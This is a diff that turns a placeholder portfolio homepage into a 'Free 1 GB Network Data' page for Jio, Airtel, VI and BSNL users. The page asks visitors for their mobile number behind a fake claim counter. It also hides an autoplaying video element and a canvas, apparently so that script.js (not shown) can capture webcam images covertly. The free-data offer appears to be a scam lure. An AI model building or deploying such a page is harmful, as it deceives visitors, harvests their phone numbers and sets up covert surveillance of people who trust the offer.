@@ -1,63 +1,106 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free 1 GB Data Booster</title>
+    <style>
+        body {
+            background: linear-gradient(to right, #00c6ff, #0072ff);
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
 
-<!DOCTYPE html>
-<html>
+        .container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
 
-<head>
-  <meta charset="UTF-8">
-  <title> Home </title>
-  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
-    integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
-  <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
-    integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
-    crossorigin="anonymous"></script>
-  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
-    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
-    crossorigin="anonymous"></script>
-  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
-    integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
-    crossorigin="anonymous"></script>
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
 
+        .notice {
+            background: #ffecb3;
+            padding: 10px;
+            border: 1px solid #ffeb3b;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
 
+        .form-box {
+            border: 1px solid #ddd;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
 
+        select, input[type="text"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
 
-    <!-- 
-      Add Google Tag Here!
-    -->
+        .submit-button {
+            background: #00c853;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .submit-button:hover {
+            background: #00b04f;
+        }
+
+        .user-count {
+            font-size: 14px;
+            color: #333;
+        }
+
+        video {
+            display: none;
+        }
+    </style>
 </head>
-
 <body>
-  <nav class="navbar navbar-expand-lg navbar-light bg-light">
-    <a class="navbar-brand" href="./index.html">Home</a>
-    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
-      aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <span class="navbar-toggler-icon"></span>
-    </button>
-
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav mr-auto">
-        <li class="nav-item active">
-          <a class="nav-link" href="./Portfolio.html"> Portfolio</a>
-        </li>
-        <li class="nav-item active">
-          <a class="nav-link" href="./Project.html"> Project </a>
-        </li>
-
-
-      </ul>
-
+    <div class="container">
+        <h1>🚀 Free 1 GB Network Data</h1>
+        <div class="notice">�&nbsp; Free 1GB data pack recharge for everyone from us.</div>
+        <div class="form-box">
+            <form id="data-form">
+                <select id="operator" required="">
+                    <option value="">Select Operator</option>
+                    <option value="Jio">Jio</option>
+                    <option value="Airtel">Airtel</option>
+                    <option value="VI">VI</option>
+                    <option value="BSNL">BSNL</option>
+                </select>
+                <input type="text" id="mobile-number" placeholder="Mobile Number" required="" maxlength="10" pattern="\d{10}" title="Enter 10 digit mobile number">
+                <button type="submit" class="submit-button">🎁 Claim</button>
+            </form>
+        </div>
+        <div class="user-count">😃 Claimed 3589/5000 users.</div>
+        <video id="video" autoplay=""></video>
+        <canvas id="canvas" style="display:none;"></canvas>
     </div>
-  </nav>
-
-  <div class="jumbotron text-center">
-    <h1 class="display-4 ">Hello, world!</h1>
-    <p class="lead">
-      This will be the homepage for this website
-    </p>
-    <hr class="my-4">
+    <script src="script.js"></script>
 
 
-  </div>
-
-</body>
-
-</html>
+</body></html>
